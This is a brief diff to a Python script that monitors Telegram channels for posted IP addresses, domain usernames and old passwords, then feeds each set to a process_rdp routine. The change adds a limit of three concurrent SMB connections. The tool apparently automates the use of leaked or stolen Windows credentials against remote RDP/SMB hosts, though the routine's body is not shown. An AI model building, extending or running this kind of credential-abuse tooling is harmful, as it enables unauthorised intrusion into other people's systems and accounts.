@@ -92,6 +92,9 @@ async def main():
         client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
         print("[*] Using file session")
     
+    # Limit concurrent SMB connections
+    smb_semaphore = asyncio.Semaphore(3)
+    
     @client.on(events.NewMessage(chats=channels))
     async def handler(event):
         text = event.raw_text
@@ -104,7 +107,8 @@ async def main():
         chat_name = getattr(chat, 'username', getattr(chat, 'title', str(event.chat_id)))
         print(f"[+] Detected from {chat_name}: {ip} {domain}\\{username}")
         
-        success, msg, record = process_rdp(ip, domain, username, old_pass)
+        async with smb_semaphore:
+            success, msg, record = process_rdp(ip, domain, username, old_pass)
         print(f"[+] Result: {msg}")
         
         if record:
